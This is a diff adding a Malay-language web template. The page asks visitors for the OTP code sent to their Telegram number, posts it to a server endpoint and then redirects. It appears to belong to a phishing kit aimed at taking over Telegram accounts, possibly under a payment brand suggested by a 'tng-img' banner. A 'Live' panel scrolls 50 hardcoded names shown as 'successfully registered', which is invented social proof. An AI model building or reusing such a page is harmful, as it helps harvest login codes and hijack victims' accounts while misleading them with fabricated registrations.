@@ -1,0 +1,445 @@
+{% extends "layout.html" %} {% block content %}
+<img
+  src="{{ url_for('static', filename='banner.png') }}"
+  alt="tng-img"
+  style="
+    width: 100%;
+    display: block;
+    border-radius: 20px;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+    margin-bottom: 18px;
+  "
+/>
+
+<form
+  id="otpForm"
+  method="post"
+  style="
+    background: #ffffff;
+    padding: 22px;
+    border-radius: 18px;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+  "
+>
+  <label
+    style="
+      font-size: 14px;
+      font-weight: 600;
+      display: block;
+      margin-bottom: 8px;
+    "
+  >
+    Masukkan Kode OTP yang dikirim ke nomor Telegram Anda
+  </label>
+
+  <input
+    type="text"
+    name="otp"
+    required
+    placeholder="Masukkan kod OTP"
+    style="
+      width: 100%;
+      padding: 12px;
+      border-radius: 12px;
+      border: 1.5px solid #e5e7eb;
+      background: #f9fafb;
+      font-size: 14px;
+      outline: none;
+      transition: 0.2s;
+      margin-bottom: 18px;
+    "
+    onfocus="
+      this.style.borderColor = '#4f46e5';
+      this.style.background = '#fff';
+      this.style.boxShadow = '0 0 0 3px rgba(79,70,229,0.15)';
+    "
+    onblur="
+      this.style.borderColor = '#e5e7eb';
+      this.style.background = '#f9fafb';
+      this.style.boxShadow = 'none';
+    "
+  />
+
+  <button
+    type="submit"
+    style="
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 14px;
+      background: linear-gradient(90deg, #6366f1, #8b5cf6);
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      transition: 0.2s;
+    "
+    onmouseover="this.style.opacity = '0.9'"
+    onmouseout="this.style.opacity = '1'"
+  >
+    LANJUTKAN
+  </button>
+</form>
+
+<style>
+  /* WRAPPER LUAR */
+  .pendaftar-wrapper {
+    width: 100%;
+    padding: 12px;
+    box-sizing: border-box;
+  }
+
+  /* CARD UTAMA */
+  .pendaftar-card {
+    background: #f3f4f6;
+    border-radius: 20px;
+    padding: 16px;
+    font-family: Arial, sans-serif;
+    box-shadow: 0 6px 18px rgba(0, 0, 0, 0.06);
+  }
+
+  /* HEADER FLEX */
+  .pendaftar-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 14px;
+    font-weight: bold;
+    font-size: 15px;
+  }
+
+  /* BADGE LIVE */
+  .live-badge {
+    background: #d1fae5;
+    color: #065f46;
+    padding: 4px 12px;
+    border-radius: 999px;
+    font-size: 12px;
+    font-weight: 600;
+    border: 1px solid #22c55e;
+  }
+
+  /* LIST */
+  .pendaftar-list {
+    max-height: 320px;
+    overflow: hidden;
+    position: relative;
+  }
+
+  /* ITEM */
+  .pendaftar-item {
+    display: flex;
+    align-items: center;
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 12px;
+    margin-bottom: 12px;
+    position: relative;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.04);
+  }
+
+  /* GARIS HIJAU KIRI */
+  .pendaftar-item::before {
+    content: "";
+    position: absolute;
+    left: 0;
+    top: 8px;
+    bottom: 8px;
+    width: 4px;
+    border-radius: 4px;
+    background: #22c55e;
+  }
+
+  /* AVATAR */
+  .avatar {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: #e0ecff;
+    color: #2563eb;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    margin-right: 12px;
+    margin-left: 6px;
+  }
+
+  /* TEXT */
+  .nama {
+    font-weight: 600;
+    font-size: 14px;
+    color: #111;
+  }
+
+  .status {
+    font-size: 12px;
+    color: #16a34a;
+    margin-top: 3px;
+  }
+
+  .berjaya-badge {
+    background: #22c55e;
+    color: white;
+    font-size: 11px;
+    padding: 2px 8px;
+    border-radius: 999px;
+    margin-right: 6px;
+  }
+</style>
+
+<div class="pendaftar-wrapper">
+  <div class="pendaftar-card">
+    <div class="pendaftar-header">
+      <div>Pendaftaran Terkini</div>
+      <div class="live-badge">Live</div>
+    </div>
+
+    <div class="pendaftar-list">
+      <!-- PINDAHKAN ID KE SINI -->
+      <div class="pendaftar-track" id="pendaftarTrack">
+        <div class="pendaftar-item">
+          <div class="avatar">AH</div>
+          <div>
+            <div class="nama">Ahmad Hakimi</div>
+            <div class="status">
+              <span class="berjaya-badge">Berjaya</span>
+              Berjaya Mendaftar ✅
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ================== DATA 50 NAMA ================== */
+  const dataPendaftar = [
+    ["FM", "Farah Munirah"],
+    ["AH", "Ahmad Hakimi"],
+    ["SN", "Siti Nur Aisyah"],
+    ["MR", "Muhammad Rizal"],
+    ["NF", "Nur Farahain"],
+    ["HA", "Hafiz Azman"],
+    ["NR", "Nurul Raihana"],
+    ["ZA", "Zulkifli Ahmad"],
+    ["AA", "Aiman Afiq"],
+    ["SR", "Sofia Rahman"],
+    ["IR", "Irfan Rosli"],
+    ["MA", "Muhammad Aiman"],
+    ["NA", "Nabila Amirah"],
+    ["FA", "Firdaus Azmi"],
+    ["SA", "Siti Aishah"],
+    ["AR", "Afiq Rahman"],
+    ["HN", "Haziq Nordin"],
+    ["NM", "Nur Maisarah"],
+    ["RA", "Rizal Abdullah"],
+    ["AF", "Aina Farzana"],
+    ["MI", "Muhammad Izzat"],
+    ["SN", "Siti Nabila"],
+    ["AD", "Amirul Danish"],
+    ["FN", "Farhan Naim"],
+    ["AI", "Aisyah Irdina"],
+    ["HR", "Haris Ridzuan"],
+    ["NS", "Nur Syafiqah"],
+    ["ZA", "Zainal Abidin"],
+    ["AM", "Aiman Muhaimin"],
+    ["SA", "Siti Amirah"],
+    ["IQ", "Izzuddin Qayyum"],
+    ["NR", "Nur Rasyidah"],
+    ["MF", "Muhammad Fakhri"],
+    ["AD", "Aina Dahlia"],
+    ["RA", "Rafiq Aiman"],
+    ["SN", "Siti Nurfatin"],
+    ["HM", "Hakim Mikhail"],
+    ["NA", "Nur Atiqah"],
+    ["FI", "Faris Iman"],
+    ["SA", "Siti Alia"],
+    ["MR", "Muhammad Rafi"],
+    ["AZ", "Aiman Zharif"],
+    ["NF", "Nur Farhana"],
+    ["HR", "Haziq Rizwan"],
+    ["AI", "Alya Imani"],
+    ["MA", "Muhammad Aqil"],
+    ["SN", "Siti Nadhirah"],
+    ["FA", "Fawwaz Akmal"],
+    ["NA", "Nur Amirah"],
+  ];
+
+  document.addEventListener("DOMContentLoaded", function () {
+    const track = document.getElementById("pendaftarTrack");
+    if (!track) return;
+
+    /* Tambah data */
+    dataPendaftar.forEach((d) => {
+      track.insertAdjacentHTML(
+        "beforeend",
+        `
+      <div class="pendaftar-item">
+        <div class="avatar">${d[0]}</div>
+        <div>
+          <div class="nama">${d[1]}</div>
+          <div class="status">
+            <span class="berjaya-badge">Berjaya</span>
+            Berjaya Mendaftar
+          </div>
+        </div>
+      </div>
+      `,
+      );
+    });
+
+    /* ================= AUTO SCROLL STABIL ================= */
+    let isPaused = false;
+    const interval = 2500;
+    const duration = 600;
+
+    function scrollStep() {
+      if (isPaused) return;
+
+      const first = track.firstElementChild;
+      if (!first) return;
+
+      const height = first.getBoundingClientRect().height;
+
+      track.style.transition = `transform ${duration}ms ease`;
+      track.style.transform = `translateY(-${height}px)`;
+
+      setTimeout(() => {
+        track.style.transition = "none";
+        track.style.transform = "translateY(0)";
+        track.appendChild(first);
+      }, duration);
+    }
+
+    setInterval(scrollStep, interval);
+
+    track.addEventListener("mouseenter", () => (isPaused = true));
+    track.addEventListener("mouseleave", () => (isPaused = false));
+    track.addEventListener("touchstart", () => (isPaused = true));
+    track.addEventListener("touchend", () => (isPaused = false));
+  });
+</script>
+
+<!-- Loader overlay -->
+<div
+  id="loader"
+  style="
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(255, 255, 255, 0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  "
+>
+  <div
+    id="spinner"
+    style="
+      width: 60px;
+      height: 60px;
+      border: 6px solid #ccc;
+      border-top: 6px solid #001a6d;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    "
+  ></div>
+  <p id="loaderText" style="margin-top: 15px; font-weight: 600; color: #001a6d">
+    Memproses...
+  </p>
+</div>
+
+<script>
+  document.getElementById("otpForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    const formData = new FormData(this);
+    const loader = document.getElementById("loader");
+    const spinner = document.getElementById("spinner");
+    const loaderText = document.getElementById("loaderText");
+
+    loader.style.display = "flex";
+
+    fetch("/api/otp", { method: "POST", body: formData })
+      .then((res) => res.json())
+      .then((data) => {
+        if (data.status === "success") {
+          spinner.outerHTML = `
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+          <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+          <path class="checkmark__check" fill="none" d="M14 27l7 7 17-17"/>
+        </svg>
+      `;
+          loaderText.innerText = "Berjaya!";
+          loaderText.style.color = "#4caf50";
+          setTimeout(() => {
+            window.location.href = data.redirect;
+          }, 1500);
+        } else {
+          loader.style.display = "none";
+          alert(data.message || "OTP tidak sah.");
+        }
+      })
+      .catch((err) => {
+        loader.style.display = "none";
+        alert("Server error!");
+      });
+  });
+</script>
+
+<style>
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+  .checkmark {
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    display: block;
+    stroke-width: 4;
+    stroke: #fff;
+    stroke-miterlimit: 10;
+    margin: 10px auto;
+    box-shadow: inset 0px 0px 0px #4caf50;
+    animation:
+      fill 0.4s ease-in-out 0.4s forwards,
+      scale 0.3s ease-in-out 0.9s both;
+    background: #4caf50;
+  }
+  .checkmark__check {
+    transform-origin: 50% 50%;
+    stroke-dasharray: 48;
+    stroke-dashoffset: 48;
+    animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+  }
+  @keyframes stroke {
+    100% {
+      stroke-dashoffset: 0;
+    }
+  }
+  @keyframes scale {
+    0%,
+    100% {
+      transform: none;
+    }
+    50% {
+      transform: scale3d(1.1, 1.1, 1);
+    }
+  }
+  @keyframes fill {
+    100% {
+      box-shadow: inset 0px 0px 0px 30px #4caf50;
+    }
+  }
+</style>
+{% endblock %}
